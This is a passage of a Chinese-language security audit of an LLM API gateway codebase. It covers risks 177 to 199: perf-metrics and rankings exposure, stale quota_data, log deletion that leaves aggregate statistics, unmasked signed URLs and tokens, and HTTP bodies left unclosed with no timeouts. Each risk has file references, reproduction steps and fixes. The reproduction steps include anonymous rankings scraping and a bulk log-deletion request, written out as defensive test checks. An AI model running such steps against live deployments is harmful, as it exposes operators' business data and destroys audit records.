- 修复建议：明确 Redis 热桶的职责。如果用于跨实例实时汇总，应在 `Query` 和 `QuerySummaryAll` 合并 Redis 当前 bucket，并支持 group 为空和 all-groups summary；如果用于崩溃恢复，应由 flush 任务或单独消费者把 Redis 已完成 bucket 幂等落库并删除/续期。增加实例关闭时 flush、启动时恢复 Redis 热桶、最小样本量标识和“数据延迟”提示。将默认 `retention_days` 改为有限值，例如 30 或 90 天，并在后台展示表大小、最旧 bucket、清理结果和清理失败告警。
- 优先级：P2。
- 当前状态：未修复。

### 风险 177：关闭 pricing 后 `/api/perf-metrics` 仍允许登录用户访问，公开开关与性能数据保护语义不一致

- 影响范围：模型性能指标、模型分组健康、pricing 页面关闭策略、运营侧“隐藏模型广场/隐藏模型数据”的预期、普通登录用户可见数据范围。
- 触发条件：管理员在 Header navigation 中关闭 Model Square，或把 pricing 设为 disabled；匿名用户不能访问 pricing/perf metrics，但任意登录用户仍可直接访问 `/api/perf-metrics` 和 `/api/perf-metrics/summary`。
- 涉及文件/函数：
  - `router/api-router.go:33-38`：`/api/pricing` 使用 `HeaderNavModuleAuth("pricing")`，而 `/api/perf-metrics/*` 使用 `HeaderNavModulePublicOrUserAuth("pricing")`。
  - `middleware/header_nav.go:104-123`：`HeaderNavModuleAuth` 在模块 disabled 时直接返回 403。
  - `middleware/header_nav.go:125-134`：`HeaderNavModulePublicOrUserAuth` 在模块 disabled 或 requireAuth 时调用 `UserAuth()`，因此 disabled 并不等于禁止访问，而是变成“登录可访问”。
  - `middleware/header_nav_test.go:133-148`：测试明确覆盖 `HeaderNavModulePublicOrUserAuth("pricing")` 在 pricing disabled 时匿名 401、登录用户 200。
  - `controller/perf_metrics.go:14-70`：perf metrics summary/detail 在通过中间件后直接返回模型性能数据。
  - `web/default/src/features/system-settings/maintenance/header-navigation-section.tsx:186-197`：后台文案描述 pricing 是“Public model catalog and pricing page”，并提供“Require login to view models”；但关闭开关对 perf metrics 的实际含义不是“禁用”，而是“仅登录可访问”。
  - `web/default/src/lib/nav-modules.ts:21-39`：前端默认配置把 pricing 作为有 enabled/requireAuth 的模块；普通 boolean 模块如 docs/about 仅影响导航展示，不承诺后端保护。
- 可能后果：运营关闭 Model Square 后，`/api/pricing` 确实被 403，但登录用户仍可直接拉取性能指标和 group 健康数据；如果站点允许开放注册或大量普通用户登录，这等同于模型广场关闭后仍向登录用户暴露真实性能画像。管理员可能误以为关闭 pricing 已隐藏所有模型广场相关数据，实际只隐藏了定价列表和导航入口。
- 复现思路：设置 `HeaderNavModules={"pricing":{"enabled":false,"requireAuth":false}}`；未登录请求 `/api/perf-metrics/summary` 返回 401，登录后同一接口返回性能数据；而 `/api/pricing` 在 disabled 状态下返回 403。
- 修复建议：统一 pricing 相关数据接口的禁用语义。若 pricing disabled 表示彻底关闭模型广场，应让 `/api/perf-metrics/*` 也使用 `HeaderNavModuleAuth("pricing")` 或新增 `HeaderNavModuleDataAuth`，在 disabled 时 403、requireAuth 时才要求登录。若希望 disabled 只隐藏导航但登录仍可访问，应在后台文案明确写成“隐藏导航，登录用户仍可直接访问性能指标”，并单独提供 performance metrics 公开/登录/关闭三态开关。
- 优先级：P2。
- 当前状态：未修复。

### 风险 178：默认公开的 rankings 返回真实模型/供应商 token 用量和 all-time 历史，泄露业务热度并可能放大 `quota_data` 查询压力

- 影响范围：公开 rankings 页面、模型热度、供应商份额、模型增长趋势、全站 token 用量、竞品情报、`quota_data` 查询压力和运营统计口径。
- 触发条件：站点保持默认 `HeaderNavModules` 或显式公开 rankings；匿名访问 `/api/rankings?period=today|week|month|year|all`；尤其是请求 `period=all` 时，后端从 `quota_data` 表起始时间聚合到当前时间。
- 涉及文件/函数：
  - `router/api-router.go:40`：`/api/rankings` 使用 `HeaderNavModuleAuth("rankings")`，默认 HeaderNav 为空时允许匿名访问。
  - `middleware/header_nav.go:13-31` 与 `web/default/src/features/system-settings/maintenance/config.ts:41-52`：HeaderNav fallback 和前端默认都将 rankings 设为 `enabled=true, requireAuth=false`。
  - `controller/rankings.go:10-21`：接口直接把 `period` 传给 `service.GetRankingsSnapshot`，默认 period 为 `week`。
  - `service/rankings.go:11-18`：榜单缓存 TTL 只有 5 分钟；每个 period 缓存独立。
  - `service/rankings.go:23-50`：响应结构包含模型排行、供应商排行、涨跌榜、模型历史和供应商份额历史。
  - `service/rankings.go:166-180`：允许 `today/week/month/year/all`；`all` 没有 duration。
  - `service/rankings.go:226-230`：当 duration 小于等于 0 时，`rankingTimeRange` 返回 `startTime=0,endTime=now`，即全量历史聚合。
  - `model/usedata_rankings.go:21-31`：模型总量从 `quota_data` 聚合 `sum(token_used)`，按模型分组并按 total_tokens 排序。
  - `model/usedata_rankings.go:34-50`：历史桶同样从 `quota_data` 按模型和 bucket 聚合 `sum(token_used)`。
  - `model/usedata_rankings.go:58-65`：`startTime=0` 时不会追加 `created_at >= ?` 下限，`period=all` 只限制 `created_at <= now`。
  - `service/rankings.go:265-290`：模型排行返回 `model_name/vendor/total_tokens/share/growth_pct`。
  - `service/rankings.go:293-356`：供应商排行返回 `vendor/total_tokens/share/growth_pct/models_count/top_model`。
  - `service/rankings.go:362-416` 与 `service/rankings.go:418-474`：历史序列返回每个时间桶的模型 token 数和供应商份额 token 数。
  - `web/default/src/features/rankings/types.ts:41-70` 与 `web/default/src/features/rankings/types.ts:126-139`：前端类型明确把 `total_tokens`、份额、增长、历史序列作为页面数据展示。
  - `model/log.go:328` 与 `model/usedata.go:12-19`：`quota_data` 来源于消费日志统计，字段包含 `model_name/created_at/token_used`，是全站真实使用量的派生统计。
- 可能后果：匿名访问者可以直接看到平台真实模型热度、供应商份额、token 总量、增长/下滑和历史曲线；`period=all` 还暴露从建站以来的累计用量结构。竞品可据此判断业务规模、热卖模型、供应商依赖和增长趋势；恶意用户可在故障或促销期间监测模型热度变化。`all` 查询会对 `quota_data` 做全量聚合和桶聚合，虽然有 5 分钟缓存，但多实例或缓存失效后仍可能成为大表查询热点。
- 复现思路：未登录访问 `/api/rankings?period=all`；响应中的 `models[].total_tokens`、`vendors[].total_tokens`、`models_history.points[].tokens`、`vendor_share_history.points[].tokens` 会返回真实聚合 token 用量。再切换 `today/week/month/year` 可获取不同窗口增长、份额和历史曲线。
- 修复建议：将 rankings 默认改为登录可见或后台可配置为关闭；公开版不返回绝对 token 数，只返回相对排名、模糊热度等级或归一化指数；`period=all` 建议只对管理员开放，或使用预计算物化表/每日汇总表并限制查询频率。增加最小样本量阈值、供应商名称脱敏选项、公开字段白名单、缓存预热和查询审计。若继续公开真实 token，用后台文案明确这是“公开业务用量榜单”，不是单纯导航开关。
- 优先级：P2。
- 当前状态：未修复。

### 风险 179：`DataExportEnabled` 关闭或 `quota_data` 写入失败后 rankings 仍公开返回旧统计，榜单会静默变成过期热度数据

- 影响范围：公开 rankings 页面、模型热度、供应商份额、运营看板、`quota_data` 统计、消费日志与榜单一致性、对外展示可信度。
- 触发条件：管理员关闭 Data Export Dashboard，或 `quota_data` 落库失败、主库异常、`SaveQuotaDataCache` 周期保存失败；`/api/rankings` 仍处于默认公开或登录可见状态。
- 涉及文件/函数：
  - `main.go:104`：服务启动后常驻运行 `go model.UpdateQuotaData()`。
  - `common/constants.go:68-70`：后端默认 `DataExportEnabled=true`、`DataExportInterval=5` 分钟。
  - `model/usedata.go:24-31`：`UpdateQuotaData` 只有在 `common.DataExportEnabled` 为 true 时才调用 `SaveQuotaDataCache()`；关闭后不再把内存中的统计写入 `quota_data`。
  - `model/log.go:280-329`：消费日志写入 `LOG_DB` 后，只有 `common.DataExportEnabled` 为 true 才异步调用 `LogQuotaData`。
  - `model/usedata.go:67-89`：`SaveQuotaDataCache` 对 `First`、`Create` 的错误不做返回和保留处理，循环结束后直接 `CacheQuotaData = make(map[string]*QuotaData)` 并记录“保存成功”。
  - `model/usedata.go:92-101`：`increaseQuotaData` 只在更新失败时写系统日志，不把失败项放回缓存或补偿队列。
  - `model/usedata.go:58-65`：`LogQuotaData` 将时间截断到小时，rankings 后续只能看到小时聚合后的派生统计。
  - `model/usedata_rankings.go:21-50`：rankings 直接从 `quota_data` 聚合 `sum(token_used)`，没有回退到 `logs` 或主表统计。
  - `service/rankings.go:183-224`：`buildRankingsSnapshot` 不检查 `DataExportEnabled`、最近一条 `quota_data.created_at`、数据延迟或保存失败状态。
  - `service/rankings.go:137-161`：rankings 缓存 5 分钟后会重新基于当前 `quota_data` 生成快照；如果 `quota_data` 停止更新，仍返回看似正常的旧热度。
  - `router/api-router.go:40`：`/api/rankings` 只受 HeaderNav rankings 开关保护，默认公开。
  - `controller/usedata.go:61-80`：用户自助 quota 图表有 1 个月跨度限制，这是正向证据；但 rankings 使用单独查询路径，不受该限制。
  - `controller/usedata.go:13-40` 与 `router/api-router.go:322-325`：后台 quota data 查询是 AdminAuth，未发现普通用户直接查询用户级 `quota_data` 的路径。
  - `web/default/src/features/system-settings/content/dashboard-section.tsx:53-55`：前端对 Data Export Dashboard 只校验开关、间隔和默认粒度，没有提示该开关会影响公开 rankings 的新鲜度。
  - `web/default/src/features/system-settings/content/index.tsx:37-39`：前端本地默认值为 `DataExportEnabled=false`，与后端常量默认 true 存在展示/默认语义差异；最终值以后端 options 为准。
- 可能后果：平台实际消费继续发生，消费日志和余额扣费正常，但公开 rankings 不再更新；外部用户和运营看到的是历史热度，却没有“数据已停止/过期”的提示。模型促销、故障切换、渠道迁移后，榜单可能继续展示旧的热门模型或供应商份额；客服、商务或用户会基于错误热度做判断。落库失败时缓存被清空会造成不可恢复的统计缺口，后续榜单和后台数据看板也无法解释缺失区间。
- 复现思路：开启 rankings，关闭 `DataExportEnabled` 或模拟 `quota_data` 写入失败；发起新模型调用并确认 `logs` 仍有消费记录、余额/渠道统计仍变化，但 `/api/rankings?period=today` 不反映新增 token，接口也没有 `data_freshness/stale_reason/last_updated_at` 字段。
- 修复建议：把 rankings 与数据导出状态显式绑定。`DataExportEnabled=false` 时应禁用 rankings 或返回明确的 stale 状态；生成 rankings 时检查 `quota_data` 最新 `created_at` 与当前时间差，超过阈值则标记 stale 或隐藏榜单。`SaveQuotaDataCache` 应逐条检查 `First/Create/Updates` 错误，失败项保留重试，并将保存结果、失败条数、最后成功时间暴露给 Admin 运维。公开 rankings 响应建议增加 `generated_at/last_source_bucket/stale` 字段，避免旧数据伪装成实时榜单。
- 优先级：P2。
- 当前状态：未修复。

### 风险 180：清理结构化消费日志不会同步处理 `quota_data`，公开榜单会保留无法追溯的历史聚合

- 影响范围：Admin 日志清理、消费日志、`quota_data` 数据看板、公开 rankings、模型/供应商历史热度、审计追溯、用户争议和运营对账。
- 触发条件：管理员在后台清理某个时间点之前的 `logs`；历史消费日志被删除，但对应小时聚合的 `quota_data` 仍保留；rankings 或数据看板继续展示这些历史 token 聚合。
- 涉及文件/函数：
  - `router/api-router.go:311-314`：`DELETE /api/log/` 使用 `AdminAuth()`，调用 `controller.DeleteHistoryLogs`。
  - `controller/log.go:153-172`：`DeleteHistoryLogs` 只解析 `target_timestamp` 并调用 `model.DeleteOldLog`，没有处理 `quota_data`、rankings 缓存或数据看板状态。
  - `model/log.go:592-610`：`DeleteOldLog` 在 `LOG_DB` 上按 `created_at < targetTimestamp` 分批删除 `Log`，不触碰主库 `quota_data`。
  - `model/log.go:280-329`：消费日志创建后异步派生 `LogQuotaData`，说明 `quota_data` 是消费日志的派生统计。
  - `model/usedata.go:58-89`：`quota_data` 以小时粒度缓存并落库；没有记录来源日志 ID、request_id 范围或可回溯 ledger。
  - `model/usedata.go:128-137`：后台数据看板可继续按 `quota_data` 汇总模型 token、quota、count。
  - `model/usedata_rankings.go:21-50`：rankings 也继续从 `quota_data` 聚合模型 token 和历史 bucket。
  - `service/rankings.go:137-161`：rankings 有 5 分钟缓存；清理 logs 后没有失效 rankings 缓存，也没有标记这些聚合已无原始日志支撑。
  - `web/default/src/features/system-settings/maintenance/log-settings-section.tsx:204-257`：前端提供“Clean history logs”并有确认弹窗，这是正向证据；但确认文案只说明删除 log entries，没有提示 `quota_data`/rankings 会保留派生统计。
  - `web/default/src/features/system-settings/api.ts:49-53`：前端清理动作只调用 `/api/log/?target_timestamp=...`，没有第二步处理统计派生表。
- 可能后果：运营为了释放日志库空间或满足日志保留要求删除历史 `logs` 后，公开 rankings 仍会展示被删除区间的模型/供应商 token 用量；一旦用户、商务或合规需要解释某段榜单来源，原始请求日志已经不可查。也可能出现后台日志统计变低、`quota_data`/rankings 仍保持旧高值的口径差异，导致“已清理日志但榜单仍泄露历史规模”的合规和运营冲突。
- 复现思路：产生一批消费日志并等待 `quota_data` 落库；调用 `DELETE /api/log/?target_timestamp=<未来时间>` 清理所有历史 logs；再访问 `/api/rankings?period=all` 或后台数据看板，仍能看到对应模型 token 聚合，但 `GET /api/log/` 已无法查回原始消费日志。
- 修复建议：将日志清理拆成“删除原始日志”和“处理派生统计”的显式策略。清理前展示影响范围：将保留/删除哪些 `quota_data` bucket、rankings 是否仍公开历史聚合、是否需要导出审计快照。可选方案包括：同步删除对应 `quota_data`、给 `quota_data` 增加 `source_logs_retained_until/source_integrity` 标记、使用不可变 ledger 作为共同来源、或者清理 logs 后让 rankings 对无原始日志支撑的区间隐藏绝对 token。清理动作也应写入不可同路删除的审计表。
- 优先级：P2。
- 当前状态：未修复。

### 风险 181：关闭“Record quota usage”会静默切断 `quota_data`/rankings 数据源，公开榜单继续展示旧数据

- 影响范围：消费日志开关、数据看板、`quota_data` 聚合表、公开 rankings、模型/供应商热度展示、运营对账、后台设置文案和客服排障。
- 触发条件：管理员出于减少数据库写入或隐私考虑关闭 `LogConsumeEnabled`；`DataExportEnabled`、HeaderNav rankings 仍保持开启；系统继续处理真实模型请求并扣费，但 `quota_data` 不再新增，公开 `/api/rankings` 仍从旧聚合表返回历史榜单。
- 涉及文件/函数：
  - `common/constants.go:68` 与 `common/constants.go:117`：后端默认 `DataExportEnabled=true`、`LogConsumeEnabled=true`，两个开关在语义上独立暴露。
  - `model/option.go:316-317` 与 `model/option.go:334-335`：后台 options 分别热更新 `LogConsumeEnabled` 和 `DataExportEnabled`，没有声明依赖或联动校验。
  - `model/log.go:280-283`：`RecordConsumeLog` 在 `!common.LogConsumeEnabled` 时直接 `return`。
  - `model/log.go:326-329`：`LogQuotaData` 的异步写入位于上述 early return 之后，因此关闭消费日志会连带跳过 `quota_data` 数据源，即使 `DataExportEnabled` 仍为 true。
  - `model/log.go:345-347`：任务账单日志在消费类型且 `LogConsumeEnabled=false` 时同样直接返回，任务类消费也会缺少消费日志入口。
  - `model/usedata.go:24-30`：周期落库只检查 `DataExportEnabled`，但它只能保存内存中的 `CacheQuotaData`；如果 `RecordConsumeLog` 已提前返回，缓存不会增长。
  - `model/usedata.go:58-65`：`LogQuotaData` 是当前小时聚合进入 `CacheQuotaData` 的入口。
  - `model/usedata_rankings.go:21-49`：rankings 只从 `quota_data` 聚合 `token_used`，没有检查 `LogConsumeEnabled`、`DataExportEnabled` 或数据源最新时间。
  - `router/api-router.go:40` 与 `controller/rankings.go:10-23`：`/api/rankings` 只按 HeaderNav rankings 权限返回 `GetRankingsSnapshot`，响应里没有 `stale_reason/last_source_bucket/source_disabled`。
  - `web/default/src/features/system-settings/operations/index.tsx:53`：维护设置前端本地默认值把 `LogConsumeEnabled` 设为 false，和后端默认 true 不一致，容易在加载失败或新增设置场景下误导操作。
  - `web/default/src/features/system-settings/maintenance/log-settings-section.tsx:184-188`：开关标题是“Record quota usage”，描述只提示“Track per-request consumption to power usage analytics”和增加数据库写入，没有说明会影响公开 rankings 数据源。
  - `web/default/src/features/system-settings/maintenance/header-navigation-section.tsx:197-205`：rankings 文案称“Public rankings page based on live usage data”，但没有提示依赖 `LogConsumeEnabled` 和 `DataExportEnabled`。
- 可能后果：运营关闭“Record quota usage”后，真实扣费、用户余额、渠道统计仍继续变化，但对外榜单和数据看板不再接收新增请求，外部访客看到的是旧热度；管理员可能误以为只是关闭详细消费日志，实际同时关闭公开榜单的上游数据源。若该状态持续，热门模型、供应商份额、增长/下降榜都会被历史数据锁住，造成市场展示、渠道判断和客服解释错误。
- 复现思路：保留 rankings 开启并确保 `quota_data` 已有历史数据；在后台关闭 `LogConsumeEnabled`，保持 `DataExportEnabled=true`；发起新的模型调用并确认余额/扣费成功；等待 `DataExportInterval` 或手动触发保存后，检查 `quota_data` 不新增该请求对应的小时聚合，`/api/rankings?period=today` 仍返回旧榜单且无 stale 标记。
- 修复建议：把“记录消费日志”和“生成 usage analytics/quota_data”拆成两个清晰入口，避免 `quota_data` 依赖 `RecordConsumeLog` 的 early return。若必须维持依赖，则在关闭 `LogConsumeEnabled` 时联动关闭或警告 `DataExportEnabled` 与 rankings，并在 `/api/rankings` 响应中返回 `source_disabled/stale_reason/last_source_bucket/generated_at`。后台文案应明确“关闭会停止数据看板和公开排行榜更新”，HeaderNav rankings 保存时也应检查数据源开关和最近 bucket 新鲜度。
- 优先级：P2。
- 当前状态：未修复。

### 风险 189：远程下载与任务结果 URL 脱敏不一致，签名链接和通知 token 可能进入日志或任务响应

- 影响范围：远程图片/文件下载、MIME 探测、视频内容代理、异步任务轮询结果、OpenAI Video 兼容响应、用户/管理员任务列表、系统日志、日志采集和客服排障流程。
- 触发条件：用户提交带签名查询参数的远程图片/文件 URL，或上游任务返回带临时签名、bucket 路径、CDN token、provider task id 的结果 URL；同时命中 Worker 下载、MIME 探测失败、视频代理解析/拉取失败、上游非 200、任务成功结果返回或任务失败错误落库等路径。
- 涉及文件/函数：
  - `common/str.go:190-264`：已有 `MaskSensitiveInfo`，会对 URL host/path/query、域名、IP 和部分 API key 样式做脱敏，这是正向证据；风险点是调用覆盖不一致。
  - `service/download.go:52-69`：非 Worker 下载日志使用 `common.MaskSensitiveInfo(originUrl)`；但 Worker 模式直接记录 `originUrl`，带签名 query 的用户 URL 会以明文进入系统日志。
  - `service/file_decoder.go:23-34`：MIME 探测下载失败或上游状态非 200 时，日志直接包含原始 `url`，没有复用脱敏函数。
  - `service/file_service.go:156-168`：`loadFromURL` 在下载错误里返回 `failed to download file from %s`，错误对象携带原始 URL；如果上层日志或 API 错误继续传播，会把 query token 一起带出。
  - `controller/video_proxy.go:113-155`：视频代理从 `task.GetResultURL()` 取得上游结果 URL，解析失败、拉取失败和上游非 200 的日志都会输出完整 `videoURL`；该 URL 往往来自上游返回的签名视频链接。
  - `model/task.go:63-65` 与 `model/task.go:99-107`：`PrivateData` 使用 `json:"-"` 隐藏，注释也说明内部可能包含 key，这是正向证据；但 `FailReason` 和 `Data` 仍是普通 JSON 字段。
  - `model/task.go:129-136`：`GetResultURL` 优先返回 `PrivateData.ResultURL`，旧数据回退到 `FailReason`；这保留了历史兼容，但也意味着旧任务可能继续把结果 URL 存在公开失败原因字段里。
  - `model/task.go:510-518`：OpenAI Video 兼容对象会把 `t.GetResultURL()` 写入 metadata 的 `url` 字段，调用方可直接看到完整结果 URL。
  - `dto/task.go:36-50` 与 `relay/relay_task.go:548-555`：任务 DTO 返回 `fail_reason`、`result_url` 和其他任务字段；用户自查任务和管理员任务列表都会经过 DTO 暴露 `ResultURL`。
  - `controller/task.go:38-66`：管理员 `/api/task/` 和用户 `/api/task/self` 都返回 `tasksToDto` 的结果；虽然用户路径按 user id 限定范围，但仍会把自身任务的签名结果 URL 暴露到前端、浏览器缓存和截图中。
  - `controller/task_video.go:101-117` 与 `controller/task_video.go:148-150`：解析 New API 格式时把 `t.FailReason` 当作 `taskResult.Url`，成功后又将非 data URI 的 URL 写回 `task.FailReason`；这是显式的旧兼容暴露路径。
  - `controller/task_video.go:241-249` 与 `service/task_polling.go:443-461`：失败路径会记录任务 JSON 或 `Task ... failed: ...`，如果上游 reason 包含原始 URL、provider token 或带签名错误信息，日志会跟着持久化。
  - `relay/relay_task.go:467-474` 与 `relay/relay_task.go:487-494`：轮询成功时会把上游 `ti.Url` 写入 `PrivateData.ResultURL`，随后非 OpenAI Video 响应仍把 `task.GetResultURL()` 放到响应 `url` 字段。
  - `service/user_notify.go:126-145` 与 `service/user_notify.go:197-239`：Bark 最终 URL 会拼接 title/content，Gotify 最终 URL 会携带 `token=`；Worker 请求体包含这些完整 URL。当前未发现 `DoWorkerRequest` 主动记录 payload，但一旦 Worker 层或错误链路记录请求体，需要统一脱敏。
  - `service/webhook.go:61-84`：Worker webhook 请求携带目标 URL、Worker key、签名头和 `Authorization: Bearer <secret>`；当前本仓库内未见直接日志输出这些字段，但这是后续日志、Worker 实现和错误返回必须红线保护的敏感载荷。
- 可能后果：签名 URL、临时下载 token、对象存储 bucket 路径、CDN 查询参数、Bark/Gotify token、Webhook secret 或上游错误中的凭证片段可能进入系统日志、日志平台、管理员任务页、用户自查任务页、OpenAI Video metadata、浏览器缓存、客服排障截图和备份。即使 URL 本身有过期时间，日志和任务记录的保存周期通常更长，会形成事故后的二次泄露面；如果上游签名有效期较长或权限过大，泄露者可能直接下载用户生成的视频、图片或文件。对运营侧来说，最危险的是同一类 URL 有些路径已脱敏、有些路径未脱敏，排查时很容易误以为“已有 MaskSensitiveInfo 就全局安全”。
- 复现思路：在本地测试环境构造 `https://example.com/file.png?X-Amz-Signature=secret&token=abc` 一类 URL。开启 Worker 后触发远程文件下载，检查系统日志是否出现完整 query；对 MIME 探测提供不可达或非 200 URL，检查 `fail to get file type from url` 和 `failed to download file from` 日志；构造一个任务结果 URL 带 `X-Amz-Signature`，调用 `/api/task/self` 或 OpenAI Video 查询接口，观察 `result_url`、metadata `url` 或旧数据 `fail_reason` 是否返回完整签名。仅在本地或隔离测试环境使用假签名 URL，不访问真实用户文件和生产对象存储。
- 修复建议：引入统一的 `SafeURLForLog`/`SafeErrorForLog` 约定，所有日志和错误链路输出 URL 前必须调用脱敏函数；`DoDownloadRequest` 的 Worker 分支、`GetFileTypeFromUrl`、`loadFromURL`、`video_proxy`、任务失败日志和上游 reason 日志应作为第一批修复点。任务持久化层应把“内部可拉取的完整结果 URL”和“对外可展示的安全 URL”分开：完整 URL 只存 `PrivateData` 或短期加密字段，对外默认返回平台代理 URL、一次性短链或已脱敏 host/path 摘要；旧兼容的 `FailReason` 不应继续承载成功结果 URL。对 `Task.Data` 和上游响应体增加字段级脱敏，至少覆盖 `url`、`result_url`、`video_url`、`token`、`signature`、`authorization`、`key` 等字段。Worker/webhook/通知请求的结构化日志只能记录 `url_hash`、host、状态码、耗时和错误分类，禁止记录完整 query、请求头密钥和 payload 中的通知内容。增加回归测试，断言带 `token=secret` 的 URL 在日志、错误字符串、DTO、metadata 和任务 Data 中不会以明文出现，确需对外返回时必须经过明确的短期授权策略。
- 优先级：P2。
- 当前状态：未修复。

### 风险 195：余额查询共用 HTTP helper 在错误路径不关闭响应体且默认可无超时，批量/定时更新可能耗尽连接或长期卡住

- 影响范围：单渠道余额查询、全渠道余额查询、`CHANNEL_UPDATE_FREQUENCY` 定时余额同步、上游模型列表检测中复用的 `GetResponseBody`、共享 HTTP client 连接池、代理连接池、Admin 后台可用性、渠道余额更新时间、自动余额不足禁用链路。
- 触发条件：Admin 点击单渠道或全量余额更新，或部署启用 `CHANNEL_UPDATE_FREQUENCY`；某个 provider 余额接口、OpenAI 兼容 billing/usage 接口或模型拉取接口返回非 200、返回响应体但读取失败、连接建立后不返回、代理卡住，且 `RELAY_TIMEOUT` 保持默认 0 或设置过大。
- 涉及文件/函数：
  - `controller/channel-billing.go:139-167`：`GetResponseBody` 在 `client.Do(req)` 成功后，如果 `res.StatusCode != http.StatusOK` 直接返回错误，未先关闭 `res.Body`；如果 `io.ReadAll(res.Body)` 返回错误，也会在执行 `res.Body.Close()` 前返回。
  - `controller/channel-billing.go:147` 与 `service/http_client.go:86-125`：余额查询通过 `service.NewProxyHttpClient` 获取共享默认 client 或按代理缓存的 client；错误路径未关闭 body 会影响可复用连接和代理连接池，而不是一次性对象自然释放。
  - `service/http_client.go:36-58`：默认 HTTP client 只有在 `common.RelayTimeout != 0` 时才设置 `Timeout`；`common/init.go:104` 将 `RELAY_TIMEOUT` 默认读成 0，`.env.example:58` 也示例为 `RELAY_TIMEOUT=0`。
  - `service/http_client.go:117-121` 与 `service/http_client.go:159-160`：代理 client 的 `Timeout` 直接设置为 `time.Duration(common.RelayTimeout) * time.Second`；当 `RelayTimeout=0` 时同样是无总超时。
  - `controller/channel-billing.go:169-421`：各 provider 余额查询都复用 `GetResponseBody`，包括 OpenAI/Custom 的 subscription 与 usage 两次请求、SiliconFlow、DeepSeek、OpenRouter、Moonshot 等分支。
  - `controller/channel-billing.go:454-481`：全量余额更新顺序遍历 enabled 且非多 key 渠道；如果某个请求长期卡住，整轮更新会停在该渠道，后续渠道不会更新余额，也不会进入余额不足判断。
  - `controller/channel-billing.go:498-503` 与 `main.go:106-112`：设置 `CHANNEL_UPDATE_FREQUENCY` 后会启动永久循环定时更新；一轮里某个 HTTP 请求无超时卡住时，该 goroutine 会停在当前轮，后续周期不会继续执行。
  - `router/api-router.go:233-245`：`/api/channel/update_balance` 和 `/api/channel/update_balance/:id` 都是 AdminAuth 下的 GET 接口；后台页面点击余额 badge 或全量更新会触发这些出站请求。
  - `web/default/src/features/channels/components/channels-columns.tsx:320-343`：渠道表余额 badge 点击后直接调用单渠道余额更新；如果后端请求长时间不返回，前端只显示 updating 状态，缺少明确的后台任务进度或可取消语义。
  - `web/default/src/features/channels/lib/channel-actions.ts:614-636`：全量余额更新成功 toast 文案提示“可能需要一段时间并刷新查看”，但后端 `UpdateAllChannelsBalance` 实际同步执行；如果某个 provider 卡住，Admin 请求本身会挂住或超时，且没有局部失败清单。
  - `controller/channel_upstream_update.go:262-329`：上游模型拉取也调用同名 `GetResponseBody`；因此该 helper 的超时和 body 关闭问题不只影响余额同步，也会影响后台模型同步类出站操作。
- 可能后果：当第三方余额接口返回 401/403/500/502 等非 200 时，响应体未关闭会导致连接无法回收到连接池，频繁点击余额更新、批量更新或定时更新可能积累空闲不可复用连接、占用文件描述符和代理连接资源。若 provider 建立连接后迟迟不返回，默认无超时会让单渠道请求、全量更新请求或定时 goroutine 长期卡住，后续渠道余额不再刷新，后台仍可能展示旧余额和旧更新时间。运营可能误以为余额监控正常，实际自动余额不足禁用没有继续运行；或者在排查余额时反复点击更新，进一步放大连接资源消耗。该问题不会直接给用户充值或扣费，但会削弱渠道成本监控和可用性控制面。
- 复现思路：本地用假 provider 暴露三个余额接口：一个返回 500 且带 body，一个接受连接后不返回响应，一个返回 body 但中途断开；把测试渠道 baseURL 或对应 provider 请求指向该服务，触发 `/api/channel/update_balance/:id` 和 `/api/channel/update_balance`。观察非 200 时连接是否保持未关闭、全量更新是否停在慢接口、`CHANNEL_UPDATE_FREQUENCY` 定时任务是否不再进入下一轮。只使用本地假服务和测试渠道，不对真实 provider 做故障注入。
- 修复建议：`GetResponseBody` 在 `client.Do` 成功后立即 `defer res.Body.Close()`，非 200 时可限长读取安全错误摘要后关闭；`io.ReadAll` 失败也必须关闭 body。为余额查询和模型拉取建立专用超时，不应完全依赖 `RELAY_TIMEOUT=0` 的 relay 语义；建议 `context.WithTimeout` 或专用 `BALANCE_QUERY_TIMEOUT_SECONDS`，同时设置 `ResponseHeaderTimeout`、最大响应体大小和每 provider 失败计数。全量余额更新应改为后台任务或至少返回逐渠道结果：成功、失败、超时、跳过多 key、未支持 provider，不应一个慢渠道阻塞整轮。定时任务需要记录 `last_start_at/last_success_at/last_error_at/checked_count/failed_count` 并在后台展示，避免静默卡死。前端应把全量更新文案改成真实异步任务或等待结果，不要在同步接口上提示“刷新查看”。
- 优先级：P2。
- 当前状态：未修复。

### 风险 199：后端未统一规范化 `models`/`group` CSV，空值、空格和超长模型可能污染 abilities、模型列表和路由缓存

- 影响范围：渠道新增/编辑、`channels.models`、`channels.group`、`abilities` 表、内存渠道缓存、用户模型列表、后台 enabled models、missing models 检测、模型定价配置匹配、渠道路由和自动重试。
- 触发条件：Admin 或脚本通过 `/api/channel` 新增/更新渠道时提交 `models` 或 `group` 为 `gpt-4,,gpt-3.5`、`,model,`、` model-with-space `、空字符串、重复逗号、带前后空格的分组、超长模型名；更新渠道时提交超过 255 字符的模型名；批量导入、上游模型同步、Ollama append/replace 或后台手工 JSON payload 绕过前端规范化；历史数据库中已经存在畸形 `models/group`。
- 涉及文件/函数：
  - `controller/channel.go:457-507`：`validateChannel` 只在新增时遍历 `channel.GetModels()` 检查模型名称长度，更新渠道时不检查模型长度；也没有校验模型名/分组非空、trim 后一致、去重、非法分隔符或总长度。
  - `model/channel.go:289-302`：`GetModels()` 只 `strings.Trim(channel.Models, ",")` 后按逗号 split，不 trim 每个模型；`GetGroups()` 会 trim group，但能力重建路径没有使用该 helper。
  - `model/ability.go:144-180` 与 `model/ability.go:219-260`：`AddAbilities`/`UpdateAbilities` 直接 `strings.Split(channel.Models, ",")` 和 `strings.Split(channel.Group, ",")`，没有过滤空字符串或 trim 空格；因此 `models=""` 会产生 model 为空的 ability，`group=""` 会产生 group 为空的 ability，`" default"` 会变成不同于 `default` 的分组。
  - `model/channel_cache.go:22-86`：内存缓存同样直接 split `channel.Group` 和 `channel.Models` 构建 `group2model2channels`，不使用规范化 helper；DB abilities 和内存缓存都会继承空值/空格污染。
  - `controller/model.go:208-285`：用户 `/models` 列表来自 `GetGroupEnabledModels`，再按 `HasModelBillingConfig` 过滤；在自用模式或允许未配置模型时，畸形模型名可能进入用户模型列表。Anthropic 分支还直接访问 `useranthropicModels[0]`，如果过滤后列表为空会有额外稳定性风险。
  - `controller/model.go:332-336`：后台 `/api/channel/models_enabled` 直接返回 `model.GetEnabledModels()`，会把空模型或带空格模型带给后台选择器和诊断界面。
  - `model/missing_models.go:3-23`：missing models 检测基于 `GetEnabledModels()`，空模型、带空格模型和重复大小写模型会进入“缺失元数据”结果，干扰真实缺失模型排查。
